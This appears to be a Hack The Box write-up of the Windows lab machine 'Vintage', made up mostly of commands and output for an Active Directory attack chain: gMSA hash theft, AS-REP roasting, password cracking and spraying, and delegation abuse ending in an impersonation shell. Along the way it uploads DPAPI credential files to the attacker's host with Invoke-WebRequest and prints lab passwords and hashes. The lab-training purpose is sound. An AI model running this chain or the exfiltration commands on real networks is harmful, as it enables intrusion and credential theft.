---
title: HTB Vintage
date: 2025-01-28 08:50:00 +/-TTTT
categories: [Hackthebox, Windows]
tags: [dpapi, kerberos]     # TAG names should always be lowercase
description: Hard Windows box featuring advanced Active Directory attacks, including Kerberos abuse, gMSA exploitation, AS-REP roasting, and privilege escalation via delegation and impersonation.
image:
  path: assets/vintage/cropped-vintage.png
---




| <img src="https://labs.hackthebox.com/storage/avatars/4eae732c7af0ce1b443d009637167610.png" width="300"> | [Vintage](https://app.hackthebox.com/machines/Vintage) Write up written by **bingbong9x**                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     |
| -------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Box IP**                                                                                               |                                10.10.11.45                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| **Release Date**                                                                                         | 30-11-2024                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| **OS**                                                                                                   | Windows                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           |
| **Difficulty**                                                                                           | <span style='color:rgb(247, 0, 0); font-weight:bold;'>Hard [40]</span>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            |
| **Public Rating** | ⭐⭐⭐⭐⭐ 4.8 / 5.0 |
 **Custom Tags**                                                                                          | #dpapi #melons-mom                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                |
| **Summary**                                                                                              | Hard-rated Windows box featuring advanced Active Directory attacks, including Kerberos abuse, gMSA exploitation, AS-REP roasting, and privilege escalation                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |

## Initial Enumaration
---
### Nmap Scan
```python
PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-12-22 20:41:25Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: vintage.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-12-22T20:41:27
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 53397/tcp): CLEAN (Timeout)
|   Check 2 (port 50316/tcp): CLEAN (Timeout)
|   Check 3 (port 61163/udp): CLEAN (Timeout)
|   Check 4 (port 13936/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: 0s

```


### Fullport scan
```python
PORT      STATE SERVICE          REASON
53/tcp    open  domain           syn-ack ttl 127
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49664/tcp open  unknown          syn-ack ttl 127
49668/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
64410/tcp open  unknown          syn-ack ttl 127
64415/tcp open  unknown          syn-ack ttl 127
64434/tcp open  unknown          syn-ack ttl 127
```

---
### SMB
```sh
nxc smb 10.10.11.45 -u users -p pass
```
This didnt work...

Oops I needed to do this on the domain controller using kerberos authentication with -k:
```sh
nxc ldap dc01.vintage.htb -k -u P.ROSA -d VINTAGE.HTB -p Rosaisbest123 --users
```
![alt text](assets/memes/skeleton-hanging-on-fan.gif)


---
### LDAP
Ran a bloodhound scan:
```sh
nxc ldap dc01.vintage.htb -k -u P.ROSA -d VINTAGE.HTB -p Rosaisbest123 --bloodhound --kdcHost dc01.vintage.htb --dns-server 10.10.11.45 --collection All
```

#### Obtaining TGT
Using the Kerberos protocol to verify and obtain the TGT ticket:
```sh
impacket-getTGT vintage.htb/P.rosa:'Rosaisbest123' -dc-ip dc01.vintage.htb 

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Saving ticket in P.rosa.ccache

export KRB5CCNAME=P.rosa.ccache
```

Now I will set the time using ntpdate and try to authenticate using the ccache file:
```sh
nxc ldap vintage.htb -u P.Rosa -k --use-kcache                               
LDAP        vintage.htb     389    dc01.vintage.htb [*]  x64 (name:dc01.vintage.htb) 
LDAP        vintage.htb     389    dc01.vintage.htb [+] vintage.htb\P.Rosa from ccache
```

This will now allow us to enumerate the users, keep in mind to do this on the domain controller. 
```sh
nxc smb dc01.vintage.htb -u P.Rosa -k --use-kcache --users
```

Bruteforced the RIDs for more users and cleaned them up:
```sh
nxc smb dc01.vintage.htb -u P.Rosa -k --use-kcache --rid-brute| grep SidTypeUser | cut -d: -f2 | cut -d \\ -f2 | cut -d' ' -f1 > users.txt


┌──(root㉿hacker)-[/home/hacker/htb/vintage]
└─# cat users.txt 
Administrator
Guest
krbtgt
DC01$
gMSA01$
FS01$
M.Rossi
R.Verdi
L.Bianchi
G.Viola
C.Neri
P.Rosa
svc_sql
svc_ldap
svc_ark
C.Neri_adm
L.Bianchi_adm
```

Downloaded Pre2k, which is a tool to query for the existence of pre-windows 2000 compuoterobjects which can be leveraged to gain a foothold in a target domain:
```sh
pre2k unauth -d vintage.htb -dc-ip 10.10.11.45 -save -inputfile /home/hacker/htb/vintage/users.txt
```

Next, FS01 belongs to the Domain Computers group and can read the password of the gMSA (Group Managed Service Account).
![[Snipaste_2024-12-02_16-54-40.png]]

Now we want to read the password hash of th eGMSA01 account
```sh
export KRB5CCNAME=FS01\$.ccache
```
For this we willl use bloodyad
```sh
python bloodyAD.py --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k get object 'GMSA01$' --attr msDS-ManagedPassword

distinguishedName: CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:7dc430b95e17ed6f817f69366f35be06
msDS-ManagedPassword.B64ENCODED: sfyyjet8CbAO5HFzqbtcCtYlqyYohprMvCgeztWhv4z/WOQOS1zcslIn9C3K/ucxzjDGRgHJS/1a54nxI0DxzlhZElfBxQL2z0KpRCrUNdKbdHXU/kzFj/i38JFgOWrx2FMIGKrEEIohO3b2fA/U/vlPxw65M+kY2krLxl5tfD1Un1kMCByA1AI4VuR5zxXSfpnzFIxKlo1PKBJUxttMqbRM21I5/aLQnaIDCnr3WaqfU6lLwdGWxoz6XSD3UiqLaW5iDPYYR47kJpnflJgS0TBUBkvd2JiLiOb5CXF1gBgUsbVLtBo/OWW/+lrvEpBtS7QIUFsOKMIaNsKFGtTkWQ==
```

by using this hash we can request a TGT ticket. 
```sh
impacket-getTGT vintage.htb/'gmsa01$' -hashes :7dc430b95e17ed6f817f69366f35be06  -dc-ip dc01.vintage.htb 

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Saving ticket in gmsa01$.ccache
```
Now its time to check the permissions of the GMSA01 account,k which ahs the permissions to write to servicemanagers group and add itself:
![[Snipaste_2024-12-02_09-30-04.png]]
Without thinking too much, add the GMSA01 account to the SERVICEMANAGERS group. Unfortunately, the pth-net command in the bloodhound help does not work, NTLM authentication is not enabled, and bloodyAD must be used.
```sh
export KRB5CCNAME=gmsa01\$.ccache
```

```sh
python bloodyAD.py --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.10.11.45 -u 'GMSA01$' -k  add groupMember "CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB"  'GMSA01$'


[+] GMSA01$ added to CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB
```

Now we need to check and see if it really joined:
```sh
python bloodyAD.py --host "dc01.vintage.htb" -d "vintage.htb" --kerberos --dc-ip 10.10.11.45 -u 'GMSA01$' -k  get object "CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB"  --attr member

distinguishedName: CN=SERVICEMANAGERS,OU=PRE-MIGRATION,DC=VINTAGE,DC=HTB
member: CN=C.Neri,CN=Users,DC=vintage,DC=htb; CN=G.Viola,CN=Users,DC=vintage,DC=htb; CN=L.Bianchi,CN=Users,DC=vintage,DC=htb; CN=gMSA01,CN=Managed Service Accounts,DC=vintage,DC=htb
```

After joining the group, gmsa01 needs to obtain tgt again, the command is the same as before. Check what the SERVICEMANAGERS group can do, and finally there is an object of First Degree Object Control.
![alt text](assets/image-7.png)

Using the gmsa01 permissions we can set the 3 accounts that can be controlled to not require PREAUTH, so we can ASREPROAST them. 
```sh
python bloodyAD.py --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k add uac SVC_ARK -f DONT_REQ_PREAUTH
```
This didnt work properly so I used both sides of the NTLM hash to request the TGT, like the following;
```sh
impacket-getTGT  -dc-ip 10.129.231.205 vintage.htb/GMSA01$ -hashes aad3b435b51404eeaad3b435b51404ee:a317f224b45046c1446372c4dc06ae53 
```

```sh
export KRB5CCNAME=GMSA01\$.ccache  
```

make the users asreproastable: 
```sh
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.129.231.205 -k add uac SVC_ARK -f DONT_REQ_PREAUTH 
```
```sh
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.129.231.205 -k add uac SVC_LDAP -f DONT_REQ_PREAUTH 
```
```sh
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.129.231.205 -k add uac SVC_SQL -f DONT_REQ_PREAUTH`
```

Enable Accounts:
```sh
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_ARK -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from SVC_ARKs userAccountControl

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_LDAP -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from SVC_LDAPs userAccountControl

bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k remove uac SVC_SQL -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from SVC_SQL's userAccountControl
```


Then I used GetNPUsers.py to get the asreproastable hashes:
```sh
GetNPUsers.py vintage.htb/ -request -outputfile np.txt -format hashcat -usersfile /home/hacker/htb/vintage/users.txt
```
For some reason thesql hash didn't work so I skipped this step... 

Crack these hashes:
```bash
$john --wordlist=/usr/share/wordlists/rockyou.txt np.txt

Zer0the0ne       ($krb5asrep$23$svc_sql@VINTAGE.HTB)
```
Password sprayed this pass using kerbrute:
```sh
kerbrute passwordspray --dc 10.10.11.45 -d vintage.htb users.txt Zer0the0ne
```
```sh
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 01/17/25 - Ronnie Flathers @ropnop

2025/01/17 19:41:29 >  Using KDC(s):
2025/01/17 19:41:29 >  	10.10.11.45:88

2025/01/17 19:41:30 >  [+] VALID LOGIN:	 C.Neri@vintage.htb:Zer0the0ne
2025/01/17 19:41:30 >  Done! Tested 17 logins (1 successes) in 0.479 seconds

```

Get tickets from C.Neri and svc_sql.
```bash
impacket-getTGT vintage.htb/C.Neri:Zer0the0ne -dc-ip dc01.vintage.htb

[*] Saving ticket in C.Neri.ccache
```
```sh
impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in svc_sql.ccache
```


C.Neri is an RM user and can log in to the terminal.
```python
cat /etc/krb5.conf
[libdefault]
        default_realm = VINTAGE.HTB
[realms]
        VINTAGE.HTB = {
                kdc = dc01.vintage.htb
                admin_server = dc01.vintage.htb
        }
[domain_realm]
        vintage.htb = VINTAGE.HTB
        .vintage.htb = VINTAGE.HTB
```


----
## Initial access
To be able to winrm on kerberos authentication you need to edit the `/etc/krb5.conf` file where I added the following: 
```sh
[libdefaults]
    default_realm = VINTAGE.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    VINTAGE.HTB = {
        kdc = dc01.vintage.htb
        admin_server = dc01.vintage.htb
    }

[domain_realm]
    .vintage.htb = VINTAGE.HTB
    vintage.htb = VINTAGE.HTB

```
(I let chatGPT create it)

Also dont forget to use the ticket for authentication:
```sh
impacket-getTGT vintage.htb/C.Neri:Zer0the0ne -dc-ip dc01.vintage.htb

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
[*] Saving ticket in C.Neri.ccache
```

```sh
export KRB5CCNAME=C.Neri.ccache

evil-winrm -i dc01.vintage.htb -r vintage.htb
```


---
## Enumeration

### What is DPAPI?
**DPAPI** (Data Protection API) is a cryptographic API in Windows operating systems that is designed to protect sensitive data, such as passwords, private keys, credentials, etc. It provides applications with the ability to encrypt and decrypt data, while hiding complex encryption operations and sim
lifying the encryption process. DPAPI is designed to ensure that only the current user or system can access the encrypted data.
### How DPAPI works
- **Encryption** : When an application or Windows system needs to store sensitive information, it can encrypt the data through DPAPI. Encryption uses the user's login credentials (such as the user's login password or the computer's key) to generate an encryption key.
- **Decryption** : DPAPI can only decrypt data using the same key in the same user context. This way, if an application or service tries to access encrypted credentials or data, only the currently logged on user or administrator can decrypt and access the information.
- **Security** : DPAPI is based on account authentication information in the Windows operating system, so its encryption key is closely associated with the user's login credentials, ensuring that only specific users can access their own encrypted data.

In the following directory we can find the microsoft credentials:
```sh
C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials
```

`use DPAPI to obtain Windows identity credentials and Using dir -h to list hidden files in powershell:`
```sh
*Evil-WinRM* PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> dir -h

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a-hs-          6/7/2024   5:08 PM            430 C4BB96844A5C9DD45D5B6A9859252BA6

download C4BB96844A5C9DD45D5B6A9859252BA6
```
The above didn't work and crashed winrm even after reset. 


#### File transfer wsgidav server
So I used wsgidav server. 
```sh
wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/hacker/htb/vintage/
```

```sh
Invoke-WebRequest -Uri "http://10.10.14.31/99cf41a3-a552-4cf7-a8d7-aca2d6f7339b" -Method PUT -InFile "C:\Users\c.neri\AppData\roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"
```

```sh
Invoke-WebRequest -Uri "http://10.10.14.31/4dbf04d8-529b-4b4c-b4ae-8e875e4fe847" -Method PUT -InFile "C:\Users\c.neri\AppData\roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\4dbf04d8-529b-4b4c-b4ae-8e875e4fe847"
```

```sh
Invoke-WebRequest -Uri "http://10.10.14.31/C4BB96844A5C9DD45D5B6A9859252BA6" -Method PUT -InFile "C:\Users\c.neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6"
```
#### Import PS active directory module 
```sh
Import-Module ActiveDirectory
```
```sh
Get-ADUser -Identity svc_sql -Properties ServicePrincipalNames

DistinguishedName     : CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
Enabled               : False
GivenName             :
Name                  : svc_sql
ObjectClass           : user
ObjectGUID            : 3fb41501-6742-4258-bfbe-602c3a8aa543
SamAccountName        : svc_sql
'ServicePrincipalNames : {}'
SID                   : S-1-5-21-4024337825-2033394866-2055507597-1134
Surname               :
UserPrincipalName     :
```

```sh
Set-ADUser -Identity svc_sql -Add @{servicePrincipalName="cifs/what_ever_name"}

Get-ADUser -Identity svc_sql -Properties ServicePrincipalNames


DistinguishedName     : CN=svc_sql,OU=Pre-Migration,DC=vintage,DC=htb
Enabled               : False
GivenName             :
Name                  : svc_sql
ObjectClass           : user
ObjectGUID            : 3fb41501-6742-4258-bfbe-602c3a8aa543
SamAccountName        : svc_sql
'ServicePrincipalNames : {cifs/what_ever_name}'
SID                   : S-1-5-21-4024337825-2033394866-2055507597-1134
Surname               :
UserPrincipalName     :
```



#### Creds
```sh
c.neri_adm : Uncr4ck4bl3P4ssW0rd0312
```

### Enumeration
![alt text](assets\image-5.png)

![alt text](assets\image-6.png)

---
### Privilege escalation
add C.NERL_ADM to DELEGATEDADMINS
```sh
python bloodyAD.py --host dc01.vintage.htb --dc-ip 10.10.11.45 -d "VINTAGE.HTB" -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember "DELEGATEDADMINS" "SVC_SQL"

[+] SVC_SQL added to DELEGATEDADMINS
```
```sh
python bloodyAD.py --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k set object "SVC_SQL" servicePrincipalName  -v "cifs/fake" 

[+] SVC_SQLs servicePrincipalName has been updated
```


Now we can get the ticket for this SVC:
```sh
impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb

export KRB5CCNAME=svc_sql.ccache
```

Impersonate L.BIANCHI_ADM user to request `cifs/dc01.vintage.htb`a service ticket for the service. After successfully obtaining the ticket, you can use it to access the service.
```sh
impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k 'vintage.htb/svc_sql:Zer0the0ne'  

export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```



---
## Root flag
Now that we have L.BIANCHI's ticket, we can directly execute the command through wmiexec
```sh
impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb 

Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\> whoami
vintage\l.bianchi_adm
C:\> type Users\Administrator\Desktop\root.txt
```


